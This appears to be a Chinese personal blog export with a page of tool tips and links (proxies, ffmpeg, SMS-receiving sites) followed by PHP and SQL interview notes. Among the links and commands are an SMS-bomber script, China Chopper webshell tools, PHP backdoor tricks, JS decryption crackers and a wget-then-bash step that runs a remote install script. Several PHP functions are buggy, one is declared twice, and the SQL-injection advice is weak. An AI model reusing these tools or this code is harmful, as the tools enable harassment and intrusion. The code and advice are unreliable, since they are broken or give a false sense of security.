运行WIN+R，cmd，启动命令行以后，输入命令 ATTRIB -S -H -R HOSTShttps://blog.gxxsite.com/hostswen-jian-bao-hu-jia-suo-yu-jie-suo-kuai-su-pei-zhi-ke-shang-github-google/ 编码1234567891011121314151617181920212223242526272829303132$cipher = "XHg2OFx4NzRceDc0XHg3MFx4NzNceDNhXHgyZlx4MmZceDc0XHg2NVx4NzJceDZkXHg2Mlx4NjlceDZlXHgyZVx4NjNceDZmXHg2ZFx4MmZceDZjXHg2Y1x4NjJceDYz";// 1. base64$escaped_hex = base64_decode($cipher);echo 'escaped_hex: ' . $escaped_hex . PHP_EOL;// 2. "\x" unescape https://learnku.com/articles/25862eval('$url = "' . $escaped_hex . '";');echo 'url: ' . $url . PHP_EOL;// 3. read this url$resource = trim( file_get_contents($url));echo 'resource: ' . $resource . PHP_EOL;// 4. trim$encoding = strstr($resource, ':', true);echo 'encoding: ' . $encoding . PHP_EOL;// 5. absorb real data$parts = explode(' ', $resource);array_shift($parts);$hex = implode('', $parts);echo 'hex: ' . $hex . PHP_EOL;// 6. get the raw binary$bin = pack('H*', $hex);// 7. final convert$results = mb_convert_encoding($bin, 'utf-8', $encoding);echo 'RESULTS: ' . $results . PHP_EOL; 命令行进度条12345678910&lt;?php echo "\033[41:37m \n Laravel ERROR : Oh My God, this is a bug!!! \n https://kuricat.com/gist/ansi-stdout-6s4pi";$count = 100;for ($i = 1; $i &lt;= 100; $i++) &#123; usleep(50000); $color = $i % 8 + 40; $equalStr = str_repeat("\033[&#123;$color&#125;;37m=\33[0m", $i); $space = str_repeat(" ", $count - $i); echo("\r [$equalStr&gt;$space]($i/$count%)");&#125; cookie编辑1234document.cookie="username=John Doe; expires=Thu, 18 Dec 2013 12:00:00 UTC; path=/"; 也可以删除cookie https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbghttps://superuser.com/questions/244062/how-do-i-view-add-or-edit-cookies-in-google-chrome 国内外免费可用接收短信验证码平台网站123456789101112131415161718192021222324252627282930https://www.09l.me/714.html免费接收短信 http://www.shejiinn.com/ 中国、缅甸Z-SMS http://z-sms.com/ 中国、美国、缅甸、爱沙尼亚免费接收短信 http://www.smszk.com/ 中国在线接收短信 https://www.becmd.com/ 美国、中国在线短信接收 https://www.pdflibr.com/ 美国、中国、菲律宾MyTrashmobile https://zh.mytrashmobile.com/ 美国、英国、加拿大FreePhonenum https://ch.freephonenum.com/ 美国、加拿大(支持免费发短信)ReceiveSMS https://www.receivesms.co/ 奥地利、比利时、加拿大、瑞士、丹麦、西班牙、英国、意大利、拉脱维亚、波兰、葡萄牙、瑞典、美国Receive SMS http://receivesmsverification.com/ 比利时、英国、美国Receive Online SMS http://receiveonlinesms.biz/ 美国、瑞典、挪威、西班牙、英国Receive Free SMS http://www.freesmsverifications.com/ 美国、英国、法国、波兰、比利时、加拿大SMS-Receive https://sms-receive.net/ 俄罗斯、法国、罗马尼亚、西班牙、荷兰、英国Receive-SMS-Now http://www.receive-sms-now.com/ 美国、加拿大、荷兰Receive SMS Online http://receivesmsonline.in/ 美国、加拿大、西班牙Receive-SMS-Now http://receivefreesms.net/ 美国、加拿大、西班牙SMSReceiveFree https://smsreceivefree.com 美国、英国、加拿大Receive SMS Online for FREE https://www.receive-sms-online.info/ 英国、罗马尼亚、美国、西班牙、法国、德国、俄罗斯Receive a SMS Online https://receive-a-sms.com/ 美国、澳大利亚、挪威、奥地利、巴西、香港、南非、波兰、英国、加拿大Free SMS Numbers Online https://smsnumbersonline.com/ 美国、英国、加拿大、波兰Receive SMS online for Free https://sms-online.co/receive-free-sms 美国、英国、加拿大、瑞典、法国、马来西亚、印度尼西亚Receive-SMS https://receive-sms.com/ 美国Receive FREE SMS online http://receivefreesms.com/ 美国、英国、挪威、瑞典、荷兰、澳大利亚、匈牙利、立陶宛、香港等RECEIVE SMS ONLINE https://www.receivesmsonline.net/ 美国、加拿大、英国Free Online Phone https://www.freeonlinephone.org 美国、加拿大、英国、瑞典Receive SMS Online http://receive-sms-online.com 俄国、英国、乌克兰TextNow https://www.textnow.com/ 美国Textfree https://www.pinger.com/text-free/ SELLAITE http://sms.sellaite.com/ 爱沙尼亚Twilio https://www.twilio.com/ 支持API调用，看上去很不错 隐藏文件夹123在命令提示符下输入：attrib +s +a +h +r d:不告诉你，回车，就彻底隐藏了D:\不告诉你文件夹了，即使在显示隐藏的文件、文件夹和驱动器下也可以将其隐藏起来。直接在地址栏输文件夹名不告诉你即可打开文件夹，神不知鬼不觉需要在命令提示符下输入：attrib -s -a -h -r d:不告诉你，回车，此时不告诉你文件夹就显示出来了。 ffmpeg1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798ffmpeg.exeffmpeg是用于转码的应用程序。一个简单的转码命令可以这样写：将input.avi转码成output.ts，并设置视频的码率为640kbpsffmpeg -i input.avi -b:v 640k output.tsffplay.exeffplay是用于播放的应用程序。一个简单的播放命令可以这样写：# 播放test.aviffplay test.avi# 将视频流下载并合并成 out.mkv ffmpeg -i http://...m3u8 -c copy out.mkvffmpeg 的一些参数基本使用方式：ffmpeg [[options][`-i’ input_file]] &#123;[options] output_file&#125; a) 通用选项ffmpeg -h 帮助，查看所有参数说明-i filename 输入文件 -b bitrate 设置比特率，缺省200kb/s -ss position 搜索到指定的时间 [-]hh:mm:ss[.xxx]的格式也支持。使用-ss参数的作用，可以从指定时间点开始转换任务，-ss后的时间单位为秒 -title string 设置标题（比如PSP中显示影片的标题） -author string 设置作者 -r fps 设置帧频 缺省25 -s size 设置帧大小 格式为W*H 缺省160*128.也可以直接使用简写-ab bitrate 设置音频码率 -ar freq 设置音频采样率 ffmepg常用的方法1.提取音频ffmpeg -i test.mp4 -acodec copy -vn output.aac # 上面的命令，默认mp4的audio codec是aac,如果不是，可以都转为最常见的aac。 ffmpeg -i test.mp4 -acodec aac -vn output.aac2.视频剪切# 下面的命令，可以从时间为00:00:15开始，截取5秒钟的视频。 ffmpeg -ss 00:00:15 -t 00:00:05 -i input.mp4 -vcodec copy -acodec copy output.mp4 # -ss表示开始切割的时间，-t表示要切多少。上面就是从15秒开始，切5秒钟出来。3.码率控制码率控制对于在线视频比较重要。因为在线视频需要考虑其能提供的带宽。那么，什么是码率？很简单：bitrate = file size / duration 比如一个文件20.8M，时长1分钟，那么，码率就是： biterate = 20.8M bit/60s = 20.810241024*8 bit/60s= 2831Kbps 一般音频的码率只有固定几种，比如是128Kbps， 那么，video的就是 video biterate = 2831Kbps -128Kbps = 2703Kbps那么ffmpeg如何控制码率？ffmpg控制码率有3种选择，-minrate -b:v -maxrate-b:v主要是控制平均码率。 比如一个视频源的码率太高了，有10Mbps，文件太大，想把文件弄小一点，但是又不破坏分辨率。ffmpeg -i input.mp4 -b:v 2000k output.mp4 上面把码率从原码率转成2Mbps码率，这样其实也间接让文件变小了。目测接近一半。 不过，ffmpeg官方wiki比较建议，设置b:v时，同时加上 -bufsize。-bufsize 用于设置码率控制缓冲器的大小，设置的好处是，让整体的码率更趋近于希望的值，减少波动。（简单来说，比如1 2的平均值是1.5， 1.49 1.51 也是1.5, 当然是第二种比较好）ffmpeg -i input.mp4 -b:v 2000k -bufsize 2000k output.mp4-minrate 就简单了，在线视频有时候，希望码率波动，不要超过一个阈值，可以设置maxrate。ffmpeg -i input.mp4 -b:v 2000k -bufsize 2000k -maxrate 2500k output.mp44.视频编码格式转换比如一个视频的编码是MPEG4，想用H264编码，咋办？ffmpeg -i input.mp4 -vcodec h264 output.mp4 # 相反也一样 ffmpeg -i input.mp4 -vcodec mpeg4 output.mp45.视频压缩将输入的1920x1080缩小到960x540输出:ffmpeg -i input.mp4 -vf scale=960:540 output.mp4 # ps: 如果540不写，写成-1，即scale=960:-1, 那也是可以的，ffmpeg会通知缩放滤镜在输出时保持原始的宽高比。6.为视频添加logo想要贴到一个视频上，那可以用如下命令：./ffmpeg -i input.mp4 -i iQIYI_logo.png -filter_complex overlay output.mp4 结果如下所示： 001.jpg要贴到其他地方？看下面：右上角： ./ffmpeg -i input.mp4 -i logo.png -filter_complex overlay=W-w output.mp4 左下角： ./ffmpeg -i input.mp4 -i logo.png -filter_complex overlay=0:H-h output.mp4 右下角： ./ffmpeg -i input.mp4 -i logo.png -filter_complex overlay=W-w:H-h output.mp47.去掉视频的logo语法：-vf delogo=x:y:w:h[:t[:show]] x:y 离左上角的坐标 w:h logo的宽和高 t: 矩形边缘的厚度默认值4 show：若设置为1有一个绿色的矩形，默认值0。ffmpeg -i input.mp4 -vf delogo=0:0:220:90:100:1 output.mp4 结果如下所示： 002.jpg8.截取视频图像ffmpeg -i input.mp4 -r 1 -q:v 2 -f image2 pic-%03d.jpeg # -r 表示每一秒几帧 # -q:v表示存储jpeg的图像质量，一般2是高质量。 如此，ffmpeg会把input.mp4，每隔一秒，存一张图片下来。假设有60s，那会有60张。可以设置开始的时间，和你想要截取的时间。ffmpeg -i input.mp4 -ss 00:00:20 -t 10 -r 1 -q:v 2 -f image2 pic-%03d.jpeg # -ss 表示开始时间 # -t 表示共要多少时间。 如此，ffmpeg会从input.mp4的第20s时间开始，往下10s，即20~30s这10秒钟之间，每隔1s就抓一帧，总共会抓10帧。干货：多个视频文件或文本文档合并成一个文件001.png 在当前目录下建立一个文本文挡，内容copy /b 1.ts + 2.ts + 3.ts new.ts然后保存，将文本文档后缀改成bat格式。打开即可将目录下的ts文件以二进制顺序合并为new.ts文件。 002.pngtxt文本同样也可以用这种方法合并http://www.golang365.com/#/blog/20 命令行科学上网实践1234567891011apt-get install xxxxlisten-address 0.0.0.0:8118forward-socks5 / localhost:1086 .sudo privoxy /usr/local/etc/privoxy/confignetstat -an | grep 8118# 效果如下# tcp4 0 0 127.0.0.1.8118 *.* LISTEN# tcp4 0 0 *.8118 *.* LISTENps -ef | grep privoxyproxy_onhttps://sanbaofengs.com/2018/06/25/command-line-proxy/ 网易云音乐歌曲变灰12345678git clone https://github.com/nondanee/UnblockNeteaseMusic.git #克隆项目仓库cd UnblockNeteaseMusic #进入项目根目录host 里面加入127.0.0.1 music.163.com127.0.0.1 interface.music.163.comnode app.js -p 80 -f 223.252.199.66重启网易云 https://learnku.com/laravel/t/32900 如何预览GitHub项目里面的网页1234567访问根目录demo.html http://xxx.github.io/DEMOs/demo.html在github上demo的仓库页面，点击“setting”按钮；找到GitHub Pages版块，选择Source为“master branch”，然后保存http://htmlpreview.github.io/http://rawgit.com/ 一键反代谷歌和谷歌学术1234567https://v2ex.com/t/247719#reply55 1. wget -N --no-check-certificate https://raw.githubusercontent.com/sakz/ngx_google_deployment/master/install.sh2. chmod 771 ./install.sh3. bash ./install.shhttps://blog.fazero.me/2016/01/19/ngx-google/ proxychains在终端使用socks5代理12345678910111213git clone https://github.com/rofl0r/proxychains-ng.gitcd proxychains-ng./configuremake &amp;&amp; make installcp ./src/proxychains.conf /etc/proxychains.confcd .. &amp;&amp; rm -rf proxychains-ngvim /etc/proxychains.confsocks5 127.0.0.1 1080需要代理的命令前加上 proxychains4 ，如：proxychains4 wget http://xxx.com/xxx.ziphttps://blog.fazero.me/2015/08/31/%E5%88%A9%E7%94%A8proxychains%E5%9C%A8%E7%BB%88%E7%AB%AF%E4%BD%BF%E7%94%A8socks5%E4%BB%A3%E7%90%86/ 免费获取歌词12345http://geci.me/api/lyric/海阔天空 http://geci.me/api/lyric/海阔天空/Beyondhttp://geci.me/api/cover/1573814 根据专辑编号获取专辑封面URLhttps://hacpai.com/article/1364440883834 Deepin 系统科学上网 PAC 自动代理12345678pip3 install genpacgenpac --pac-compress --pac-proxy 'SOCKS5 127.0.0.1:1080' --format pac -o ~/auto.pac设置系统代理，设置 &gt; 网络 &gt; 系统代理 &gt; 自动配置 URL：file:///home/登录用户名/auto.pachttps://gleehub.com/tool/deepin-xi-tong-ke-xue-shang-wang-pac-zi-dong-dai-li.html 环境变量1234567891011121314151617$ export GOPROXY=https://goproxy.cn$ echo "export GOPROXY=https://goproxy.cn" &gt;&gt; ~/.profile &amp;&amp; source ~/.profile打开你的 PowerShell 并执行：C:\&gt; $env:GOPROXY = "https://goproxy.cn"或者1. 打开“开始”并搜索“env”2. 选择“编辑系统环境变量”3. 点击“环境变量…”按钮4. 在“&lt;你的用户名&gt; 的用户变量”章节下（上半部分）5. 点击“新建…”按钮6. 选择“变量名”输入框并输入“GOPROXY”7. 选择“变量值”输入框并输入“https://goproxy.cn”8. 点击“确定”按钮https://learnku.com/articles/37926 豆丁网文档复制抓取工具 https://www.docin365.com/ 上学吧365答案查询工具 https://www.shangxueba365.com/ 为什么要自己搭建翻墙服务？ https://github.com/xiaoming2028/kexueshangwang/wiki https://workers.cloudflare.com/ https://etherdream.github.io/jsproxy/Google代理 https://noisy-tooth-2ee5.susheng.workers.dev/ 摸鱼网站整理https://withpinbox.com/explore/collection/266629 短信轰炸机脚本TBomb https://github.com/TheSpeedX/TBomb 在线模拟vim https://www.openvim.com/ 免费的定时任务托管 clock.sh https://github.com/clock-sh/ticket https://github.com/yehux/Coot http://fonts.safe.360.cn/360 有一个查询字体版权的网站。 妹子图站技术方案https://sssis.me/post/meizitu.html https://qingbuyaohaixiu.com/ 各种App、小程序、网站的请求签名算法。 现已有：自如、小红书、蛋壳公寓 https://github.com/gadfly0x/signature_algorithm 逆向App用的都是iOS 某JS最牛加密脱壳解密破解去混淆工具https://www.qs5.org/Post/673.html https://cn.v2ex.com/t/596794#reply28 www.sojson.com 网站高级JS加密破解 https://github.com/insoxin/sojson.v5 https://obfuscator.io/https://github.com/javascript-obfuscator/javascript-obfuscator/ https://cn.v2ex.com/t/597018#reply10 翻墙https://github.com/txthinking/brook jsproxy 可以一键脚本部署的呀, 前端页面可以放在 github pages 上面. 也提供了 cloudflare workers https://workers.cloudflare.com/ 的部署方法, 比如说这个是我搭的 https://proxy.jimmytinsley.workers.dev/https://github.com/EtherDream/jsproxy/tree/master/cf-workerhttps://github.com/aploium/zmirrorhttps://github.com/aploium/zmirror-onekey一键部署脚本 Google镜像https://g.zmirrordemo.com/https://fetch.ffeii.workers.dev/https://google.comhttps://github.com/You2php/you2phphttps://noisy-tooth-2ee5.susheng.workers.dev/-----https://google.comhttps://proxy.zme.ink/www.google.com/search一键部署Google等镜像 – zmirrorhttps://uixsj.cn/1706.html利用 cloudflare workers 加速wget https://fetch.ffeii.workers.dev/https://www.openssl.org/source/openssl-1.1.1c.tar.gzHTTP请求代理，CORS跨域请求，HTTPS支持https://proxy.netnr.com/ https://proxy.zme.ink/www.google.comhttps://github.com/Rob--W/cors-anywherehttps://cors-anywhere.herokuapp.com/https://google.comVPN翻墙教程 https://mp.weixin.qq.com/s/tE_XRsQOCutfGFjrx3UHrg项目主页： https://you2php.github.io （需要梯子）项目地址： https://github.com/You2php https://sphard2.github.io/gfw/free/ssr.html一个简单的PHP Web代理https://github.com/joshdick/miniProxy为什么要自己搭建翻墙服务？ https://github.com/xiaoming2028/kexueshangwang/wiki翻墙 在线技术面试平台showmebug LaTeX 搜索引擎 canvas图片水印 SS/SSR/V2ray 免费google分享节点账号信息网站 12306识别验证码http://shell.teachx.cn:12306/ 新媒体工具箱 github上的工具集合子域名枚举扫描器或爆破工具 ctf工具 工具集SCI-Hub科研论文网址 google镜像 在线分解质因子数学题 微博监督员批量拉黑工具 中国菜刀之类菜刀工具的使用 html 转 pdf 命令行工具 wkhtmltopdf 翻墙工具google 酷炫的 HTML5 网页 PPT 一个有意思的解密 好用的office/windows激活工具 Charles抓包修改APP数据 impress.js制作ppt www.caiqianyu.com/impress/impress.html#/step-14 听全网音乐 持续更新免费的 API github.com/fangzesheng/free-api 语音快速转文字www.luyinla.com/luyinla.html Google代理 修改Charles网络请求 write-ups-2017 视频下载 功能强大的内网穿透代理服务器 渗透测试 奇淫异巧之 PHP 后门 各种系统下Shadowsocks客户端的安装与配置 免费ss、ssr账号分享，Shadowsocks免费账号 查询自己邮箱密码是否泄漏 带着小白了解下比特币区块链技术 精选资源 私密的文件分享 OCR图片文字识别 文件中转http://tmp.link/ 分享发现的好资源，好工具 chrome插件下载https://www.chromefor.com/ 知乎markdown ss翻墙 Windows上那些值得推荐的良心软件 黑科技工具 下载工具fdm Chrome商店Crx离线安装包下载 通过谷歌云（GCP）免费科学上网一年https://www.wmsoho.com/google-cloud-platform-ssr-bbr-tutorial/ 订阅网站更新 动画短片素材网站-Vidlery vip视频免费看 Frp实现内网穿透 vip无广告电影 黑客派 在线版俄罗斯方块 GitHub 上开源的这个坦克大战小游戏https://battle-city.js.org/#/ 在线 Logo 制作工具 导航网站 shadowsocks+vps+mac翻墙Vultr 搜索YouTube视频 Git的奇技淫巧 css奇技淫巧 Xmanager Power Suit 安装 闲鱼搜索 https://s.2.taobao.com/list/list.htm?q=%E5%85%B3%E9%94%AE%E8%AF%8D&amp;search_type=item&amp;app=shopsearch 翻译工具 https://www.ltool.net/japanese-full-jenkaku-to-half-hankaku-converter-in-simplified-chinese.php 幕布精选」投稿指南 https://mubu.com/doc/rBSPqyZmqp 心智阅读系列：如何主动学习]]></content>
      <tags>
        <tag>黑科技</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[面试资料收集]]></title>
    <url>%2F2019%2F02%2F28%2F%E9%9D%A2%E8%AF%95%E8%B5%84%E6%96%99%E6%94%B6%E9%9B%86%2F</url>
    <content type="text"><![CDATA[###鉴别出那瓶水有毒1234567891011121314151617有1000瓶水，其中有一瓶有毒，小白鼠只要尝一点带毒的水24小时后就会死亡，至少要多少只小白鼠才能在24小时时鉴别出那瓶水有毒链接：https://www.nowcoder.com/questionTerminal/84726a200b4a4a0d95b9565b4c6eb216来源：牛客网每个老鼠只有死或活2种状态，因此每个老鼠可以看作一个bit，取0或1N个老鼠可以看作N个bit，可以表达2^N种状态（其中第i个状态代表第i个瓶子有毒）例如：当N＝2时，可以表达4种状态0，0（ 一号老鼠活，二号老鼠活）0，1（ 一号老鼠活，二号老鼠死）1，0（ 一号老鼠死，二号老鼠活）1，1（ 一号老鼠死，二号老鼠死）具体来说，有A、B、C、D这4个瓶子，一号老鼠喝A和B， 二号老鼠喝B和C如果 0，0 （ 一号老鼠活，二号老鼠活），说明是D有毒，第0个状态代表第4个瓶子有毒如果 0，1 （ 一号老鼠活，二号老鼠死） ，说明是C有毒 ，第1个状态代表第3个瓶子有毒如果 1，0 （ 一号老鼠死，二号老鼠活） ，说明是A有毒 ，第2个状态代表第1个瓶子有毒如果 1，1 （ 一号老鼠死，二号老鼠死） ，说明是B有毒 ，第3个状态代表第2个瓶子有毒可以想象成用2进制来表示1000个数最少需要多少位 Cookie 禁用了，Session 还能用吗12345678910111213141516171819202122你第一次访问网站时，https://learnku.com/articles/25858 服务端脚本中开启了Sessionsession_start();，服务器会生成一个不重复的 SESSIONID 的文件session_id();，比如在/var/lib/php/session目录并将返回(Response)如下的HTTP头 Set-Cookie:PHPSESSIONID=xxxxxxx客户端接收到Set-Cookie的头，将PHPSESSIONID写入cookie当你第二次访问页面时，所有Cookie会附带的请求头(Request)发送给服务器端服务器识别PHPSESSIONID这个cookie，然后去session目录查找对应session文件，找到这个session文件后，检查是否过期，如果没有过期，去读取Session文件中的配置；如果已经过期，清空其中的配置如果一个Cookie都没接收到，基本上可以预判客户端禁用了Cookie，那将session_id附带在每个网址后面(包括POST)，比如：GET http://www.xx.com/index.php?session_id=xxxxxPOST http://www.xx.com/post.php?session_id=xxxxx然后在每个页面的开头使用session_id($_GET['session_id'])，来强制指定当前session_id所以Laravel等框架中，内部实现了Session的所有逻辑，并将PHPSESSIONID设置为httponly并加密，这样，前端JS就无法读取和修改这些敏感信息，降低了被盗用的风险。 如何进行防 SQL 注入1234561 表单尽量用 post 提交,核心用户验证都走 post,避开 get容易暴露客户数据2 使用HTTP_REFERER 检查源文件是否来自本系统3 开启addslashes在特殊符号前加\4 使用htmlspecialchars对字符串转实体5 用户授权登录6 使用PDO 大流量高并发量网站的解决方案12345678910111213对比现实中饭店一下子同一个时间段来吃饭 比方中午https://learnku.com/articles/258861 把这个店面面积扩大点，增加同时吃饭人数 服务器优化：我们把apache服务器只支持（3000并发）可以换成nginx服务器（3w并发）2 多找点服务员和厨师嘛 服务器优化：修改apache，nginx的默认配置，把其中的并发数调到最高嘛3 多开一些店 连锁店 服务器优化：多增加几台服务器同时对客户提供网络服务 lvs nginx 做负载均衡4 限时客户在我们店吃饭的时间 不能让他们吃完还打牌把 服务器优化：减少客户在服务器上的连接断开时间 比方mysql 的连接断开时间 wait_timeout这个参数最多的连接时间 不能让客户恶意一直连着5 给厨师培训 增加他的上菜时间 那就要给php代码做优化6 让厨师叫手下把菜提前做好 放到冰箱里面 redis 缓存 文件缓存 sql分组123456789101112131415161718192021221) 算出每个班级中的学生，按照成绩降序排序;https://learnku.com/articles/25903#topnavselect name,class,score from student order by class,score desc;2) 查出每个班的及格人数和不及格人数，格式为:class、及格人数、不及格人数;SELECT class,SUM(CASE WHEN score&gt;=60 THEN 1 ELSE 0 END),SUM(CASE WHEN score&lt;60 THEN 1 ELSE 0 END)FROM tb1 GROUP BY class这边主要先分组 在聚合在加入判断条件3) 用 PHP 写入连接数据库("localhost","msuser","mspass")、执行以上 SQL、显示结果、 判断错误、关闭数据库的过程$conn=mysql_connect(‘localhost’,'msuser ’,’mspass′);//链接数据库Mysql_select_db(‘test’);$sql=" SELECT class,SUM(CASE WHEN score&gt;=60 THEN 1 ELSE 0 END), SUM(CASE WHEN score&lt;60 THEN 1 ELSE 0 END)FROM tb1 GROUP BY class";if($result=Mysql_query($sql))&#123; while($row=mysql_fetch_assoc($result))&#123; print_r($row);&#125; &#125;Mysql_close($conn); GET 与 POST 的区别12345678910111213141516171819202122232425262728293031323334353637383940414243444546GET在浏览器回退时是无害的，而POST会再次提交请求。GET产生的URL地址可以被Bookmark，而POST不可以。GET请求会被浏览器主动cache，而POST不会，除非手动设置。GET请求只能进行url编码，而POST支持多种编码方式。GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。GET请求在URL中传送的参数是有长度限制的，而POST么有。对参数的数据类型，GET只接受ASCII字符，而POST没有限制。GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。GET参数通过URL传递，POST放在Request body中GET产生一个TCP数据包；POST产生两个TCP数据包。https://learnku.com/articles/25881对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200（返回数据）；而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok（返回数据）。也就是说，GET只需要汽车跑一趟就把货送到了，而POST得跑两趟，第一趟，先去和服务器打个招呼“嗨，我等下要送一批货来，你们打开门迎接我”，然后再回头把货送过去。因为POST需要两步，时间上消耗的要多一点，看起来GET比POST更有效。因此Yahoo团队有推荐用GET替换POST来优化网站性能。但这是一个坑！跳入需谨慎。为什么？1. GET与POST都有自己的语义，不能随便混用。2. 据研究，在网络环境好的情况下，发一次包的时间和发两次包的时间差别基本可以无视。而在网络环境差的情况下，两次包的TCP在验证数据包完整性上，有非常大的优点。3. 并不是所有浏览器都会在POST中发送两次包，Firefox就只发送一次。浏览器有没有默认发送 Expect:100-continue 的请求头就不清楚, 但是 curl 是默认会发送的. 具体的解释可以看鸟哥的博客: http://www.laruence.com/2011/01/20/1840.html摘抄一下重点:在使用curl做POST的时候, 当要POST的数据大于1024字节的时候, curl并不会直接就发起POST请求, 而是会分为俩步, 1. 发送一个请求, 包含一个Expect:100-continue, 询问Server使用愿意接受数据 2. 接收到Server返回的100-continue应答以后, 才把数据POST给Server并不是所有的Server都会正确应答100-continue, 比如lighttpd, 就会返回417 “Expectation Failed”, 则会造成逻辑出错.因此, 在使用 curl 时可以考虑增加一步处理, 既在请求头中将 Expect 值置空. 鸟哥给出的 demo 是这样curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));guzzle 的做法是:// If the Expect header is not present, prevent curl from adding itif (!$request-&gt;hasHeader('Expect')) &#123; $conf[CURLOPT_HTTPHEADER][] = 'Expect:';&#125; nginx 配置12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152server &#123; # 监听 HTTP 协议默认的 [80] 端口。https://learnku.com/articles/25861 listen 80; # 绑定主机名 [example.com]。 server_name example.com; # 服务器站点根目录 [/example.com/public]。 root /example.com/public; # 添加几条有关安全的响应头；与 Google+ 的配置类似，详情参见文末。 add_header X-Frame-Options "SAMEORIGIN"; add_header X-XSS-Protection "1; mode=block"; add_header X-Content-Type-Options "nosniff"; # 站点默认页面；可指定多个，将顺序查找。 # 例如，访问 http://example.com/ Nginx 将首先尝试「站点根目录/index.html」是否存在，不存在则继续尝试「站点根目录/index.htm」，以此类推... index index.html index.htm index.php; # 指定字符集为 UTF-8 charset utf-8; # Laravel 默认重写规则；删除将导致 Laravel 路由失效且 Nginx 响应 404。 location / &#123; try_files $uri $uri/ /index.php?$query_string; &#125; # 关闭 [/favicon.ico] 和 [/robots.txt] 的访问日志。 # 并且即使它们不存在，也不写入错误日志。 location = /favicon.ico &#123; access_log off; log_not_found off; &#125; location = /robots.txt &#123; access_log off; log_not_found off; &#125; # 将 [404] 错误交给 [/index.php] 处理，表示由 Laravel 渲染美观的错误页面。 error_page 404 /index.php; # URI 符合正则表达式 [\.php$] 的请求将进入此段配置 location ~ \.php$ &#123; # 配置 FastCGI 服务地址，可以为 IP:端口，也可以为 Unix socket。 fastcgi_pass unix:/var/run/php/php7.2-fpm.sock; # 配置 FastCGI 的主页为 index.php。 fastcgi_index index.php; # 配置 FastCGI 参数 SCRIPT_FILENAME 为 $realpath_root$fastcgi_script_name。 fastcgi_param SCRIPT_FILENAME $realpath_root$fastcgi_script_name; # 引用更多默认的 FastCGI 参数。 include fastcgi_params; &#125; # 通俗地说，以上配置将所有 URI 以 .php 结尾的请求，全部交给 PHP-FPM 处理。 # 除符合正则表达式 [/\.(?!well-known).*] 之外的 URI，全部拒绝访问 # 也就是说，拒绝公开以 [.] 开头的目录，[.well-known] 除外 location ~ /\.(?!well-known).* &#123; deny all; &#125;&#125; ###判断两个有序数组是否有公共元素1234567891011121314151617181920// https://github.com/chunlintang/interview/blob/master/src/algorithms/common.phpfunction common($arr1, $arr2)&#123; $len1 = count($arr1); $len2 = count($arr2); $common = []; $i = $j = 0; while ($i &lt; $len1 &amp;&amp; $j &lt; $len2) &#123; if ($arr1[$i] &gt; $arr2[$j]) &#123; $j++; &#125; elseif ($arr1[$i] &lt; $arr2[$j]) &#123; $i++; &#125; else &#123; array_push($common, $arr1[$i]); $i++; $j++; &#125; &#125; return $common;&#125; 猴子选大王，约瑟夫环1234567891011121314// function monkeyKing($n, $m)&#123; $arr = [1, $n]; $i = 0; while (count($arr) &gt; 1) &#123; $i++; $survice = array_shift($arr); if ($i % $m != 0) &#123; array_push($arr, $survice); &#125; &#125; return $arr[0];&#125; 质数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111// 质数function prime($n)&#123; $prime = [2]; for ($i = 3; $i &lt; $n; $i += 2) &#123; $sqrt = intval(sqrt($i)); for ($j = 3; $j &lt;= $sqrt; $j += 2) &#123; if ($i % $j == 0) &#123; break; &#125; &#125; if ($i &gt; $sqrt) &#123; array_push($prime, $i); &#125; &#125; return $prime;&#125;/** * 获取所有的质数 * @param array $arr * @return array */function get_prime_number($arr = []) &#123; // 质数数组 $primeArr = []; // 循环所有备选数 foreach ($arr as $value) &#123; // 备选数和备选数的中间数以下的数字整除比较 for ($i = 2; $i &lt;= floor($value / 2); $i++) &#123; // 能够整除，则不是质数，退出循环 if ($value % $i == 0) &#123; break; &#125; &#125; // 被除数$j比备选数的中间数大的则为质数 // 这样判断的依据： // 假如备选数为质数，则内层的for循环不会break退出，则执行完毕，$i会继续+1，即最后$i = floor($value / 2) + 1 // 假如备选数不为质数，则内层的for循环遇到整除就会break退出，$i不会继续+1，即最后$i &lt;= floor($value / 2) if ($value != 1 &amp;&amp; $i &gt; floor($value / 2)) &#123; $primeArr[] = $value; &#125; &#125; return $primeArr;&#125;/** * 获取所有的质数 * @param array $arr * @return array */function get_prime_number($arr = []) &#123; // 质数数组 $primeArr = []; // 循环所有备选数 foreach ($arr as $value) &#123; // 备选数和备选数的中间数以下的数字整除比较 for ($i = 2; $i &lt;= floor($value / $i); $i++) &#123; // 能够整除，则不是质数，退出循环 if ($value % $i == 0) &#123; break; &#125; &#125; // 被除数$j比备选数的中间数大的则为质数 // 这样判断的依据： // 假如备选数为质数，则内层的for循环不会break退出，则执行完毕，$i会继续+1，即最后$i = floor($value / $i) + 1 // 假如备选数不为质数，则内层的for循环遇到整除就会break退出且$i不会继续+1，即最后$i &lt;= floor($value / $i) if ($value != 1 &amp;&amp; $i &gt; floor($value / $i)) &#123; $primeArr[] = $value; &#125; &#125; return $primeArr;&#125;/** * 获取所有的质数 * @param array $arr * @return array */function get_prime_number_three($arr = []) &#123; // 质数数组 $primeArr = $arr; // 循环所有备选数 foreach ($primeArr as $key =&gt; $value) &#123; if ($value == 1) &#123; unset($primeArr[$key]); continue; &#125; // 备选数和备选数的中间数以下的数字整除比较 for ($i = 2; $i &lt;= floor($value / $i); $i++) &#123; // 能够整除，则不是质数，从数组中删除且退出循环 if ($value % $i == 0) &#123; unset($primeArr[$key]); break; &#125; &#125; &#125; // 重置数组索引返回 return array_values($primeArr);&#125;// 所有备选数数组$numberArr = range(1, 100, 1);// 获取备选数中的所有质数$primeNumberArr = get_prime_number($numberArr);// 输出打印print_r($primeNumberArr);// 所有备选数数组$numberArr = [11, 22, 33, 66, 77, 3, 8, 10, 99];// 获取备选数中的所有质数$primeNumberArr = get_prime_number($numberArr);// 